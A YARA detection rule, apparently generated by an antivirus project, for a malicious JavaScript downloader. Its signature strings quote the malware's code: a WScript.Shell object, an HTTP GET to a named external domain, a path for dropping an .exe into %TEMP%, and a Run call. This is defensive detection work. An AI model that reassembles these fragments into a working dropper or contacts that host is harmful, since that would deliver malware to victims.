rule sig_20160328_b4f117592536c0ef960849b5069f035f {
  meta:
    description = "datamaliciousorder - file 20160328_b4f117592536c0ef960849b5069f035f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b18521632629b6905129823ed43850be5628884f783022d3d80da9199fcd2dd9"

  strings:
    $s1  = "function Iuqgikf() {return Jaodrenalp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"56LeWBSkzhd.exe\";};" fullword ascii
    $s2  = "Dvskpvyl[Bvbvgwpg](\"GET\", \"http://darjewellery.com/kwo9pa\", false);" fullword ascii
    $s3  = "do {WScript[Qqwav](Wxdujqpqp() * 11)} while (Dvskpvyl[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Yyozeifwhp(Oaotfwj, Bsvzc){return Oaotfwj - Bsvzc;};" fullword ascii
    $s5  = "var Jaodrenalp = function Qkdgpyjob() {return WScript[Ejnaj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Mvtpgxkejq(Wwyikf){Jaodrenalp[\"Run\"](Wwyikf, Uochc, Uochc);};" fullword ascii
    $s7  = "function Qofoo() {return ((Lplklmnqyr == true) && (Lplklmnqyr == Thftwxdgzn)) ? 1 : Uochc;};" fullword ascii
    $s8  = "var Lplklmnqyr = false;" fullword ascii
    $s9  = "var Thftwxdgzn = false;" fullword ascii
    $s10 = "Thftwxdgzn = true; " fullword ascii
    $s11 = "function Akvvwqjpbt(){return Cxsjpl;};" fullword ascii
    $s12 = "var Jrmnglhqtx = new this[\"Date\"]();" fullword ascii
    $s13 = " while (Ntdvyi){" fullword ascii
    $s14 = "return Yyozeifwhp(Sotzrhso, Iniezbgz);" fullword ascii
    $s15 = "function Gooketf(Fgtrcewh) {var Uwioe = (1, 2, 3, 4, 5, Fgtrcewh); return Uwioe;};" fullword ascii
    $s16 = "Lplklmnqyr = true; " fullword ascii
    $s17 = "function Wxdujqpqp(){return 22;};" fullword ascii
    $s18 = "function Petovxqrv()" fullword ascii
    $s19 = "var Yckokwdtl = false;" fullword ascii
    $s20 = "function Uxwbnsux(){return Ejnaj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}